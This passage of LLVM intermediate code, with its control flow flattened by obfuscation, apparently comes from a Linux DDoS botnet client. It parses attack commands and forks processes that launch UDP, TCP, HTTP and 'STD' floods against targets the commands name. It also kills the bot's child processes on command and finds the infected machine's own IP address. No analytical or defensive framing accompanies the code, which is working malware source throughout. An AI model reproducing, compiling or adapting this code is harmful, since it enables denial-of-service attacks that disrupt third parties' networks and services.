  %189 = load i8*, i8** %188, align 8
  %190 = call i32 @atoi(i8* %189) #9
  store i32 1022176284, i32* %switchVar
  store i32 %190, i32* %.reg2mem4
  br label %loopEnd

; <label>:191:                                    ; preds = %loopEntry
  store i32 1022176284, i32* %switchVar
  store i32 1000000, i32* %.reg2mem4
  br label %loopEnd

; <label>:192:                                    ; preds = %loopEntry
  %.reload5 = load i32, i32* %.reg2mem4
  store i32 %.reload5, i32* %14, align 4
  %193 = load i32, i32* %3, align 4
  %194 = icmp sgt i32 %193, 8
  %195 = select i1 %194, i32 -209611075, i32 1926346032
  store i32 %195, i32* %switchVar
  br label %loopEnd

; <label>:196:                                    ; preds = %loopEntry
  %197 = load i8**, i8*** %4, align 8
  %198 = getelementptr inbounds i8*, i8** %197, i64 8
  %199 = load i8*, i8** %198, align 8
  %200 = call i32 @atoi(i8* %199) #9
  store i32 396878187, i32* %switchVar
  store i32 %200, i32* %.reg2mem6
  br label %loopEnd

; <label>:201:                                    ; preds = %loopEntry
  store i32 396878187, i32* %switchVar
  store i32 0, i32* %.reg2mem6
  br label %loopEnd

; <label>:202:                                    ; preds = %loopEntry
  %.reload7 = load i32, i32* %.reg2mem6
  store i32 %.reload7, i32* %15, align 4
  %203 = load i8*, i8** %8, align 8
  %204 = call i8* @strstr(i8* %203, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.117, i32 0, i32 0)) #9
  %205 = icmp ne i8* %204, null
  %206 = select i1 %205, i32 1629480433, i32 -1676104356
  store i32 %206, i32* %switchVar
  br label %loopEnd

; <label>:207:                                    ; preds = %loopEntry
  %208 = load i8*, i8** %8, align 8
  %209 = call i8* @strtok(i8* %208, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.117, i32 0, i32 0)) #3
  store i8* %209, i8** %16, align 8
  store i32 1238783001, i32* %switchVar
  br label %loopEnd

; <label>:210:                                    ; preds = %loopEntry
  %211 = load i8*, i8** %16, align 8
  %212 = icmp ne i8* %211, null
  %213 = select i1 %212, i32 -1523590967, i32 -172812117
  store i32 %213, i32* %switchVar
  br label %loopEnd

; <label>:214:                                    ; preds = %loopEntry
  %215 = call i32 @listFork()
  %216 = icmp ne i32 %215, 0
  %217 = select i1 %216, i32 249977108, i32 -755352331
  store i32 %217, i32* %switchVar
  br label %loopEnd

; <label>:218:                                    ; preds = %loopEntry
  %219 = load i8*, i8** %16, align 8
  %220 = load i32, i32* %9, align 4
  %221 = load i32, i32* %10, align 4
  %222 = load i32, i32* %11, align 4
  %223 = load i32, i32* %12, align 4
  %224 = load i32, i32* %13, align 4
  %225 = load i32, i32* %14, align 4
  %226 = load i32, i32* %15, align 4
  call void @sendUDP(i8* %219, i32 %220, i32 %221, i32 %222, i32 %223, i32 %224, i32 %225, i32 %226)
  call void @_exit(i32 0) #12
  unreachable

; <label>:227:                                    ; preds = %loopEntry
  %228 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.117, i32 0, i32 0)) #3
  store i8* %228, i8** %16, align 8
  store i32 1238783001, i32* %switchVar
  br label %loopEnd

; <label>:229:                                    ; preds = %loopEntry
  store i32 1753487897, i32* %switchVar
  br label %loopEnd

; <label>:230:                                    ; preds = %loopEntry
  %231 = call i32 @listFork()
  %232 = icmp ne i32 %231, 0
  %233 = select i1 %232, i32 1761761725, i32 -1206062277
  store i32 %233, i32* %switchVar
  br label %loopEnd

; <label>:234:                                    ; preds = %loopEntry
  %235 = load i8*, i8** %8, align 8
  %236 = load i32, i32* %9, align 4
  %237 = load i32, i32* %10, align 4
  %238 = load i32, i32* %11, align 4
  %239 = load i32, i32* %12, align 4
  %240 = load i32, i32* %13, align 4
  %241 = load i32, i32* %14, align 4
  %242 = load i32, i32* %15, align 4
  call void @sendUDP(i8* %235, i32 %236, i32 %237, i32 %238, i32 %239, i32 %240, i32 %241, i32 %242)
  call void @_exit(i32 0) #12
  unreachable

; <label>:243:                                    ; preds = %loopEntry
  store i32 1753487897, i32* %switchVar
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  store i32 -68452959, i32* %switchVar
  br label %loopEnd

; <label>:245:                                    ; preds = %loopEntry
  %246 = load i8**, i8*** %4, align 8
  %247 = getelementptr inbounds i8*, i8** %246, i64 0
  %248 = load i8*, i8** %247, align 8
  %249 = call i32 @strcmp(i8* %248, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.129, i32 0, i32 0)) #9
  %250 = icmp ne i32 %249, 0
  %251 = select i1 %250, i32 -432359136, i32 -1688445231
  store i32 %251, i32* %switchVar
  br label %loopEnd

; <label>:252:                                    ; preds = %loopEntry
  %253 = load i32, i32* %3, align 4
  %254 = icmp slt i32 %253, 6
  %255 = select i1 %254, i32 540192990, i32 -1868638908
  store i32 %255, i32* %switchVar
  br label %loopEnd

; <label>:256:                                    ; preds = %loopEntry
  %257 = load i8**, i8*** %4, align 8
  %258 = getelementptr inbounds i8*, i8** %257, i64 3
  %259 = load i8*, i8** %258, align 8
  %260 = call i32 @atoi(i8* %259) #9
  %261 = icmp eq i32 %260, -1
  %262 = select i1 %261, i32 540192990, i32 -50609966
  store i32 %262, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  %264 = load i8**, i8*** %4, align 8
  %265 = getelementptr inbounds i8*, i8** %264, i64 2
  %266 = load i8*, i8** %265, align 8
  %267 = call i32 @atoi(i8* %266) #9
  %268 = icmp eq i32 %267, -1
  %269 = select i1 %268, i32 540192990, i32 -1586616668
  store i32 %269, i32* %switchVar
  br label %loopEnd

; <label>:270:                                    ; preds = %loopEntry
  %271 = load i8**, i8*** %4, align 8
  %272 = getelementptr inbounds i8*, i8** %271, i64 4
  %273 = load i8*, i8** %272, align 8
  %274 = call i32 @atoi(i8* %273) #9
  %275 = icmp eq i32 %274, -1
  %276 = select i1 %275, i32 540192990, i32 1605908572
  store i32 %276, i32* %switchVar
  br label %loopEnd

; <label>:277:                                    ; preds = %loopEntry
  %278 = load i8**, i8*** %4, align 8
  %279 = getelementptr inbounds i8*, i8** %278, i64 4
  %280 = load i8*, i8** %279, align 8
  %281 = call i32 @atoi(i8* %280) #9
  %282 = icmp sgt i32 %281, 32
  %283 = select i1 %282, i32 540192990, i32 -2034649631
  store i32 %283, i32* %switchVar
  br label %loopEnd

; <label>:284:                                    ; preds = %loopEntry
  %285 = load i32, i32* %3, align 4
  %286 = icmp sgt i32 %285, 6
  %287 = select i1 %286, i32 622055072, i32 -423398024
  store i32 %287, i32* %switchVar
  br label %loopEnd

; <label>:288:                                    ; preds = %loopEntry
  %289 = load i8**, i8*** %4, align 8
  %290 = getelementptr inbounds i8*, i8** %289, i64 6
  %291 = load i8*, i8** %290, align 8
  %292 = call i32 @atoi(i8* %291) #9
  %293 = icmp slt i32 %292, 0
  %294 = select i1 %293, i32 540192990, i32 -423398024
  store i32 %294, i32* %switchVar
  br label %loopEnd

; <label>:295:                                    ; preds = %loopEntry
  %296 = load i32, i32* %3, align 4
  %297 = icmp eq i32 %296, 8
  %298 = select i1 %297, i32 -965053246, i32 1598323326
  store i32 %298, i32* %switchVar
  br label %loopEnd

; <label>:299:                                    ; preds = %loopEntry
  %300 = load i8**, i8*** %4, align 8
  %301 = getelementptr inbounds i8*, i8** %300, i64 7
  %302 = load i8*, i8** %301, align 8
  %303 = call i32 @atoi(i8* %302) #9
  %304 = icmp slt i32 %303, 1
  %305 = select i1 %304, i32 540192990, i32 1598323326
  store i32 %305, i32* %switchVar
  br label %loopEnd

; <label>:306:                                    ; preds = %loopEntry
  store i32 -68452959, i32* %switchVar
  br label %loopEnd

; <label>:307:                                    ; preds = %loopEntry
  %308 = load i8**, i8*** %4, align 8
  %309 = getelementptr inbounds i8*, i8** %308, i64 1
  %310 = load i8*, i8** %309, align 8
  store i8* %310, i8** %17, align 8
  %311 = load i8**, i8*** %4, align 8
  %312 = getelementptr inbounds i8*, i8** %311, i64 2
  %313 = load i8*, i8** %312, align 8
  %314 = call i32 @atoi(i8* %313) #9
  store i32 %314, i32* %18, align 4
  %315 = load i8**, i8*** %4, align 8
  %316 = getelementptr inbounds i8*, i8** %315, i64 3
  %317 = load i8*, i8** %316, align 8
  %318 = call i32 @atoi(i8* %317) #9
  store i32 %318, i32* %19, align 4
  %319 = load i8**, i8*** %4, align 8
  %320 = getelementptr inbounds i8*, i8** %319, i64 4
  %321 = load i8*, i8** %320, align 8
  %322 = call i32 @atoi(i8* %321) #9
  store i32 %322, i32* %20, align 4
  %323 = load i8**, i8*** %4, align 8
  %324 = getelementptr inbounds i8*, i8** %323, i64 5
  %325 = load i8*, i8** %324, align 8
  store i8* %325, i8** %21, align 8
  %326 = load i32, i32* %3, align 4
  %327 = icmp eq i32 %326, 8
  %328 = select i1 %327, i32 -1680731454, i32 -1297572384
  store i32 %328, i32* %switchVar
  br label %loopEnd

; <label>:329:                                    ; preds = %loopEntry
  %330 = load i8**, i8*** %4, align 8
  %331 = getelementptr inbounds i8*, i8** %330, i64 7
  %332 = load i8*, i8** %331, align 8
  %333 = call i32 @atoi(i8* %332) #9
  store i32 458075438, i32* %switchVar
  store i32 %333, i32* %.reg2mem8
  br label %loopEnd

; <label>:334:                                    ; preds = %loopEntry
  store i32 458075438, i32* %switchVar
  store i32 10, i32* %.reg2mem8
  br label %loopEnd

; <label>:335:                                    ; preds = %loopEntry
  %.reload9 = load i32, i32* %.reg2mem8
  store i32 %.reload9, i32* %22, align 4
  %336 = load i32, i32* %3, align 4
  %337 = icmp sgt i32 %336, 6
  %338 = select i1 %337, i32 1614118996, i32 -2060071844
  store i32 %338, i32* %switchVar
  br label %loopEnd

; <label>:339:                                    ; preds = %loopEntry
  %340 = load i8**, i8*** %4, align 8
  %341 = getelementptr inbounds i8*, i8** %340, i64 6
  %342 = load i8*, i8** %341, align 8
  %343 = call i32 @atoi(i8* %342) #9
  store i32 298528811, i32* %switchVar
  store i32 %343, i32* %.reg2mem10
  br label %loopEnd

; <label>:344:                                    ; preds = %loopEntry
  store i32 298528811, i32* %switchVar
  store i32 0, i32* %.reg2mem10
  br label %loopEnd

; <label>:345:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  store i32 %.reload11, i32* %23, align 4
  %346 = load i8*, i8** %17, align 8
  %347 = call i8* @strstr(i8* %346, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.117, i32 0, i32 0)) #9
  %348 = icmp ne i8* %347, null
  %349 = select i1 %348, i32 2094075046, i32 -1086659377
  store i32 %349, i32* %switchVar
  br label %loopEnd

; <label>:350:                                    ; preds = %loopEntry
  %351 = load i8*, i8** %17, align 8
  %352 = call i8* @strtok(i8* %351, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.117, i32 0, i32 0)) #3
  store i8* %352, i8** %24, align 8
  store i32 529220737, i32* %switchVar
  br label %loopEnd

; <label>:353:                                    ; preds = %loopEntry
  %354 = load i8*, i8** %24, align 8
  %355 = icmp ne i8* %354, null
  %356 = select i1 %355, i32 8449640, i32 1330654823
  store i32 %356, i32* %switchVar
  br label %loopEnd

; <label>:357:                                    ; preds = %loopEntry
  %358 = call i32 @listFork()
  %359 = icmp ne i32 %358, 0
  %360 = select i1 %359, i32 1116843514, i32 104388661
  store i32 %360, i32* %switchVar
  br label %loopEnd

; <label>:361:                                    ; preds = %loopEntry
  %362 = load i8*, i8** %24, align 8
  %363 = load i32, i32* %18, align 4
  %364 = load i32, i32* %19, align 4
  %365 = load i32, i32* %20, align 4
  %366 = load i8*, i8** %21, align 8
  %367 = load i32, i32* %23, align 4
  %368 = load i32, i32* %22, align 4
  call void @sendTCP(i8* %362, i32 %363, i32 %364, i32 %365, i8* %366, i32 %367, i32 %368)
  call void @_exit(i32 0) #12
  unreachable

; <label>:369:                                    ; preds = %loopEntry
  %370 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.117, i32 0, i32 0)) #3
  store i8* %370, i8** %24, align 8
  store i32 529220737, i32* %switchVar
  br label %loopEnd

; <label>:371:                                    ; preds = %loopEntry
  store i32 1131971354, i32* %switchVar
  br label %loopEnd

; <label>:372:                                    ; preds = %loopEntry
  %373 = call i32 @listFork()
  %374 = icmp ne i32 %373, 0
  %375 = select i1 %374, i32 2065379651, i32 646199181
  store i32 %375, i32* %switchVar
  br label %loopEnd

; <label>:376:                                    ; preds = %loopEntry
  %377 = load i8*, i8** %17, align 8
  %378 = load i32, i32* %18, align 4
  %379 = load i32, i32* %19, align 4
  %380 = load i32, i32* %20, align 4
  %381 = load i8*, i8** %21, align 8
  %382 = load i32, i32* %23, align 4
  %383 = load i32, i32* %22, align 4
  call void @sendTCP(i8* %377, i32 %378, i32 %379, i32 %380, i8* %381, i32 %382, i32 %383)
  call void @_exit(i32 0) #12
  unreachable

; <label>:384:                                    ; preds = %loopEntry
  store i32 1131971354, i32* %switchVar
  br label %loopEnd

; <label>:385:                                    ; preds = %loopEntry
  store i32 -432359136, i32* %switchVar
  br label %loopEnd

; <label>:386:                                    ; preds = %loopEntry
  %387 = load i8**, i8*** %4, align 8
  %388 = getelementptr inbounds i8*, i8** %387, i64 0
  %389 = load i8*, i8** %388, align 8
  %390 = call i32 @strcmp(i8* %389, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.130, i32 0, i32 0)) #9
  %391 = icmp ne i32 %390, 0
  %392 = select i1 %391, i32 -416839073, i32 1082329967
  store i32 %392, i32* %switchVar
  br label %loopEnd

; <label>:393:                                    ; preds = %loopEntry
  %394 = load i32, i32* %3, align 4
  %395 = icmp slt i32 %394, 6
  %396 = select i1 %395, i32 1863958306, i32 1681329342
  store i32 %396, i32* %switchVar
  br label %loopEnd

; <label>:397:                                    ; preds = %loopEntry
  %398 = load i8**, i8*** %4, align 8
  %399 = getelementptr inbounds i8*, i8** %398, i64 3
  %400 = load i8*, i8** %399, align 8
  %401 = call i32 @atoi(i8* %400) #9
  %402 = icmp slt i32 %401, 1
  %403 = select i1 %402, i32 1863958306, i32 -473571401
  store i32 %403, i32* %switchVar
  br label %loopEnd

; <label>:404:                                    ; preds = %loopEntry
  %405 = load i8**, i8*** %4, align 8
  %406 = getelementptr inbounds i8*, i8** %405, i64 5
  %407 = load i8*, i8** %406, align 8
  %408 = call i32 @atoi(i8* %407) #9
  %409 = icmp slt i32 %408, 1
  %410 = select i1 %409, i32 1863958306, i32 -968831200
  store i32 %410, i32* %switchVar
  br label %loopEnd

; <label>:411:                                    ; preds = %loopEntry
  store i32 -68452959, i32* %switchVar
  br label %loopEnd

; <label>:412:                                    ; preds = %loopEntry
  %413 = call i32 @listFork()
  %414 = icmp ne i32 %413, 0
  %415 = select i1 %414, i32 1660972625, i32 755172887
  store i32 %415, i32* %switchVar
  br label %loopEnd

; <label>:416:                                    ; preds = %loopEntry
  store i32 -68452959, i32* %switchVar
  br label %loopEnd

; <label>:417:                                    ; preds = %loopEntry
  %418 = load i8**, i8*** %4, align 8
  %419 = getelementptr inbounds i8*, i8** %418, i64 1
  %420 = load i8*, i8** %419, align 8
  %421 = load i8**, i8*** %4, align 8
  %422 = getelementptr inbounds i8*, i8** %421, i64 2
  %423 = load i8*, i8** %422, align 8
  %424 = load i8**, i8*** %4, align 8
  %425 = getelementptr inbounds i8*, i8** %424, i64 3
  %426 = load i8*, i8** %425, align 8
  %427 = call i32 @atoi(i8* %426) #9
  %428 = trunc i32 %427 to i16
  %429 = load i8**, i8*** %4, align 8
  %430 = getelementptr inbounds i8*, i8** %429, i64 4
  %431 = load i8*, i8** %430, align 8
  %432 = load i8**, i8*** %4, align 8
  %433 = getelementptr inbounds i8*, i8** %432, i64 5
  %434 = load i8*, i8** %433, align 8
  %435 = call i32 @atoi(i8* %434) #9
  %436 = load i8**, i8*** %4, align 8
  %437 = getelementptr inbounds i8*, i8** %436, i64 6
  %438 = load i8*, i8** %437, align 8
  %439 = call i32 @atoi(i8* %438) #9
  call void @SendHTTP(i8* %420, i8* %423, i16 zeroext %428, i8* %431, i32 %435, i32 %439)
  call void @exit(i32 0) #11
  unreachable

; <label>:440:                                    ; preds = %loopEntry
  %441 = load i8**, i8*** %4, align 8
  %442 = getelementptr inbounds i8*, i8** %441, i64 0
  %443 = load i8*, i8** %442, align 8
  %444 = call i32 @strcmp(i8* %443, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.131, i32 0, i32 0)) #9
  %445 = icmp ne i32 %444, 0
  %446 = select i1 %445, i32 -1593398547, i32 -57365951
  store i32 %446, i32* %switchVar
  br label %loopEnd

; <label>:447:                                    ; preds = %loopEntry
  %448 = load i32, i32* %3, align 4
  %449 = icmp slt i32 %448, 4
  %450 = select i1 %449, i32 -1922193240, i32 -1707247287
  store i32 %450, i32* %switchVar
  br label %loopEnd

; <label>:451:                                    ; preds = %loopEntry
  %452 = load i8**, i8*** %4, align 8
  %453 = getelementptr inbounds i8*, i8** %452, i64 2
  %454 = load i8*, i8** %453, align 8
  %455 = call i32 @atoi(i8* %454) #9
  %456 = icmp slt i32 %455, 1
  %457 = select i1 %456, i32 -1922193240, i32 -1999313277
  store i32 %457, i32* %switchVar
  br label %loopEnd

; <label>:458:                                    ; preds = %loopEntry
  %459 = load i8**, i8*** %4, align 8
  %460 = getelementptr inbounds i8*, i8** %459, i64 3
  %461 = load i8*, i8** %460, align 8
  %462 = call i32 @atoi(i8* %461) #9
  %463 = icmp slt i32 %462, 1
  %464 = select i1 %463, i32 -1922193240, i32 840344656
  store i32 %464, i32* %switchVar
  br label %loopEnd

; <label>:465:                                    ; preds = %loopEntry
  store i32 -68452959, i32* %switchVar
  br label %loopEnd

; <label>:466:                                    ; preds = %loopEntry
  %467 = load i8**, i8*** %4, align 8
  %468 = getelementptr inbounds i8*, i8** %467, i64 1
  %469 = load i8*, i8** %468, align 8
  store i8* %469, i8** %25, align 8
  %470 = load i8**, i8*** %4, align 8
  %471 = getelementptr inbounds i8*, i8** %470, i64 2
  %472 = load i8*, i8** %471, align 8
  %473 = call i32 @atoi(i8* %472) #9
  store i32 %473, i32* %26, align 4
  %474 = load i8**, i8*** %4, align 8
  %475 = getelementptr inbounds i8*, i8** %474, i64 3
  %476 = load i8*, i8** %475, align 8
  %477 = call i32 @atoi(i8* %476) #9
  store i32 %477, i32* %27, align 4
  %478 = load i8*, i8** %25, align 8
  %479 = call i8* @strstr(i8* %478, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.117, i32 0, i32 0)) #9
  %480 = icmp ne i8* %479, null
  %481 = select i1 %480, i32 876494975, i32 1559669210
  store i32 %481, i32* %switchVar
  br label %loopEnd

; <label>:482:                                    ; preds = %loopEntry
  %483 = load i8*, i8** %25, align 8
  %484 = call i8* @strtok(i8* %483, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.117, i32 0, i32 0)) #3
  store i8* %484, i8** %28, align 8
  store i32 -294001962, i32* %switchVar
  br label %loopEnd

; <label>:485:                                    ; preds = %loopEntry
  %486 = load i8*, i8** %28, align 8
  %487 = icmp ne i8* %486, null
  %488 = select i1 %487, i32 1334119309, i32 -1245373158
  store i32 %488, i32* %switchVar
  br label %loopEnd

; <label>:489:                                    ; preds = %loopEntry
  %490 = call i32 @listFork()
  %491 = icmp ne i32 %490, 0
  %492 = select i1 %491, i32 -1735473480, i32 -521727425
  store i32 %492, i32* %switchVar
  br label %loopEnd

; <label>:493:                                    ; preds = %loopEntry
  %494 = load i8*, i8** %28, align 8
  %495 = load i32, i32* %26, align 4
  %496 = load i32, i32* %27, align 4
  call void @sendSTD(i8* %494, i32 %495, i32 %496)
  call void @_exit(i32 0) #12
  unreachable

; <label>:497:                                    ; preds = %loopEntry
  %498 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.117, i32 0, i32 0)) #3
  store i8* %498, i8** %28, align 8
  store i32 -294001962, i32* %switchVar
  br label %loopEnd

; <label>:499:                                    ; preds = %loopEntry
  store i32 1889851286, i32* %switchVar
  br label %loopEnd

; <label>:500:                                    ; preds = %loopEntry
  %501 = call i32 @listFork()
  %502 = icmp ne i32 %501, 0
  %503 = select i1 %502, i32 -910484065, i32 -1530003776
  store i32 %503, i32* %switchVar
  br label %loopEnd

; <label>:504:                                    ; preds = %loopEntry
  store i32 -68452959, i32* %switchVar
  br label %loopEnd

; <label>:505:                                    ; preds = %loopEntry
  %506 = load i8*, i8** %25, align 8
  %507 = load i32, i32* %26, align 4
  %508 = load i32, i32* %27, align 4
  call void @sendSTD(i8* %506, i32 %507, i32 %508)
  call void @_exit(i32 0) #12
  unreachable

; <label>:509:                                    ; preds = %loopEntry
  store i32 -1593398547, i32* %switchVar
  br label %loopEnd

; <label>:510:                                    ; preds = %loopEntry
  %511 = load i8**, i8*** %4, align 8
  %512 = getelementptr inbounds i8*, i8** %511, i64 0
  %513 = load i8*, i8** %512, align 8
  %514 = call i32 @strcmp(i8* %513, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.132, i32 0, i32 0)) #9
  %515 = icmp ne i32 %514, 0
  %516 = select i1 %515, i32 -68452959, i32 -1343712919
  store i32 %516, i32* %switchVar
  br label %loopEnd

; <label>:517:                                    ; preds = %loopEntry
  store i32 0, i32* %29, align 4
  store i64 0, i64* %30, align 8
  store i32 -766693825, i32* %switchVar
  br label %loopEnd

; <label>:518:                                    ; preds = %loopEntry
  %519 = load i64, i64* %30, align 8
  %520 = load i64, i64* @numpids, align 8
  %521 = icmp ult i64 %519, %520
  %522 = select i1 %521, i32 208124900, i32 1521506572
  store i32 %522, i32* %switchVar
  br label %loopEnd

; <label>:523:                                    ; preds = %loopEntry
  %524 = load i32*, i32** @pids, align 8
  %525 = load i64, i64* %30, align 8
  %526 = getelementptr inbounds i32, i32* %524, i64 %525
  %527 = load i32, i32* %526, align 4
  %528 = icmp ne i32 %527, 0
  %529 = select i1 %528, i32 89660872, i32 767657516
  store i32 %529, i32* %switchVar
  br label %loopEnd

; <label>:530:                                    ; preds = %loopEntry
  %531 = load i32*, i32** @pids, align 8
  %532 = load i64, i64* %30, align 8
  %533 = getelementptr inbounds i32, i32* %531, i64 %532
  %534 = load i32, i32* %533, align 4
  %535 = call i32 @getpid() #3
  %536 = icmp ne i32 %534, %535
  %537 = select i1 %536, i32 1102337616, i32 767657516
  store i32 %537, i32* %switchVar
  br label %loopEnd

; <label>:538:                                    ; preds = %loopEntry
  %539 = load i32*, i32** @pids, align 8
  %540 = load i64, i64* %30, align 8
  %541 = getelementptr inbounds i32, i32* %539, i64 %540
  %542 = load i32, i32* %541, align 4
  %543 = call i32 @kill(i32 %542, i32 9) #3
  %544 = load i32, i32* %29, align 4
  %545 = add nsw i32 %544, 1
  store i32 %545, i32* %29, align 4
  store i32 767657516, i32* %switchVar
  br label %loopEnd

; <label>:546:                                    ; preds = %loopEntry
  store i32 -1263569800, i32* %switchVar
  br label %loopEnd

; <label>:547:                                    ; preds = %loopEntry
  %548 = load i64, i64* %30, align 8
  %549 = add i64 %548, 1
  store i64 %549, i64* %30, align 8
  store i32 -766693825, i32* %switchVar
  br label %loopEnd

; <label>:550:                                    ; preds = %loopEntry
  store i32 -68452959, i32* %switchVar
  br label %loopEnd

; <label>:551:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %550, %547, %546, %538, %530, %523, %518, %517, %510, %509, %504, %500, %499, %497, %489, %485, %482, %466, %465, %458, %451, %447, %440, %416, %412, %411, %404, %397, %393, %386, %385, %384, %372, %371, %369, %357, %353, %350, %345, %344, %339, %335, %334, %329, %307, %306, %299, %295, %288, %284, %277, %270, %263, %256, %252, %245, %244, %243, %230, %229, %227, %214, %210, %207, %202, %201, %196, %192, %191, %186, %182, %181, %176, %153, %152, %145, %141, %134, %127, %120, %113, %106, %99, %92, %88, %81, %80, %76, %75, %71, %69, %64, %63, %59, %52, %49, %48, %44, %37, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #5

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #3
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -625493129, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -625493129, label %first
    i32 1934619779, label %16
    i32 -1792276991, label %17
    i32 -1942327938, label %31
    i32 -1999536386, label %32
    i32 -2086320723, label %39
    i32 2036223682, label %40
    i32 -610967670, label %45
    i32 1992581563, label %51
    i32 -98555207, label %56
    i32 1166619664, label %58
    i32 1433163740, label %64
    i32 177532212, label %67
    i32 -1813247341, label %69
    i32 -366941826, label %71
    i32 -620505471, label %78
    i32 1630630214, label %86
    i32 1857181460, label %90
    i32 -1290756134, label %102
    i32 -1144987013, label %105
    i32 20421108, label %106
    i32 -536589002, label %109
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp eq i32 %.reload, -1
  %15 = select i1 %14, i32 1934619779, i32 -1792276991
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 -536589002, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 16, i32 4, i1 false)
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %19, align 4
  %20 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.133, i32 0, i32 0)) #3
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %22 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %21, i32 0, i32 0
  store i32 %20, i32* %22, align 4
  %23 = call zeroext i16 @htons(i16 zeroext 53) #10
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %23, i16* %24, align 2
  %25 = load i32, i32* %2, align 4
  %26 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %27 = call i32 @connect(i32 %25, %struct.sockaddr* %26, i32 16)
  store i32 %27, i32* %4, align 4
  %28 = load i32, i32* %4, align 4
  %29 = icmp eq i32 %28, -1
  %30 = select i1 %29, i32 -1942327938, i32 -1999536386
  store i32 %30, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 -536589002, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 16, i32* %6, align 4
  %33 = load i32, i32* %2, align 4
  %34 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %35 = call i32 @getsockname(i32 %33, %struct.sockaddr* %34, i32* %6) #3
  store i32 %35, i32* %4, align 4
  %36 = load i32, i32* %4, align 4
  %37 = icmp eq i32 %36, -1
  %38 = select i1 %37, i32 -2086320723, i32 2036223682
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 -536589002, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %42 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %41, i32 0, i32 0
  %43 = load i32, i32* %42, align 4
  store i32 %43, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %44 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.134, i32 0, i32 0), i32 0)
  store i32 %44, i32* %7, align 4
  store i32 -610967670, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %47 = load i32, i32* %7, align 4
  %48 = call i8* @fdgets(i8* %46, i32 4096, i32 %47)
  %49 = icmp ne i8* %48, null
  %50 = select i1 %49, i32 1992581563, i32 -366941826
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %53 = call i8* @strstr(i8* %52, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.135, i32 0, i32 0)) #9
  %54 = icmp ne i8* %53, null
  %55 = select i1 %54, i32 -98555207, i32 -1813247341
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %57, i8** %9, align 8
  store i32 1166619664, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i8*, i8** %9, align 8
